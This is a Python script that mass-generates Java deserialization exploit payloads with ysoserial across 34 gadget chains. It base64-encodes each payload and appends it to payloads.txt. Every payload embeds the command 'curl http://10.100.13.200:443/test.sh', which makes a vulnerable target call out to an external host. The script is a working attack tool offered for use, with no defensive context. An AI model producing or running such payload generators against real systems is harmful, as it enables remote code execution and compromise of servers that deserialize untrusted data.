import os

payloads = ["AspectJWeaver",
"BeanShell1",
"C3P0",
"Click1",
"Clojure",
"CommonsBeanutils1",
"CommonsCollections1",
"CommonsCollections2",
"CommonsCollections3",
"CommonsCollections4",
"CommonsCollections5",
"CommonsCollections6",
"CommonsCollections7",
"FileUpload1",
"Groovy1",
"Hibernate1",
"Hibernate2",
"JBossInterceptors1",
"JRMPClient",
"JRMPListener",
"JSON1",
"JavassistWeld1",
"Jdk7u21",
"Jython1",
"MozillaRhino1",
"MozillaRhino2",
"Myfaces1",
"Myfaces2",
"ROME",
"Spring1",
"Spring2",
"URLDNS",
"Vaadin1",
"Wicket1"]

for payload in payloads:
    cmd = f"java -jar ysoserial-all.jar {payload} 'curl http://10.100.13.200:443/test.sh' | base64 -w0"
    encoded_payload = os.popen(cmd).read().strip()
    with open("payloads.txt", "a") as f:
        f.write(encoded_payload+"\n")